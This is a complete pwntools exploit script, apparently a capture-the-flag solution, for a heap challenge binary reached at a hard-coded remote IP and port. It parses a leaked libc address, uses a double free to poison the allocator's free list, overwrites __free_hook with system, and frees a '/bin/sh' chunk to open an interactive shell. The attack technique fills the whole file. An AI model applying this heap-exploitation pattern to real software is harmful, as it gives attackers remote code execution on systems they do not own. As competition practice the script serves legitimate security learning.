#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./chall')
context.terminal = ['kitty', '-e', 'sh', '-c']
host = args.HOST or '65.1.92.179'
port = int(args.PORT or 49155)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak *main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()


def create(idx, size, content):
    io.recv(timeout=2)
    io.sendline("1")
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("size: ", str(size))
    io.sendlineafter("input: ", content)

def delete(idx):
    io.recv(timeout=2)
    io.sendline("2")

    io.sendlineafter("index: ", str(idx))

libc = ELF("./libc.so.6")

io.recvuntil("Hello traveller! Here is a gift: ")
libc.address = int(io.recvline().strip("\n"), 16) - 0x17bbc0
log.info("libc base : %s " % hex(libc.address))
log.info("free hook : %s " % hex(libc.sym['__free_hook']))
log.info("system : %s " % hex(libc.sym['system']))

create(0, 32, "AAAA")
create(1, 32, "AAAA")
delete(0)
delete(1)
delete(0)
create(2, 32, p64(libc.sym['__free_hook']))
create(1, 32, "AAAA")
create(0, 32, "AAAA")
create(3, 32, p64(libc.sym['system']))
create(4, 32, "/bin/sh\x00")
delete(4)
io.interactive()

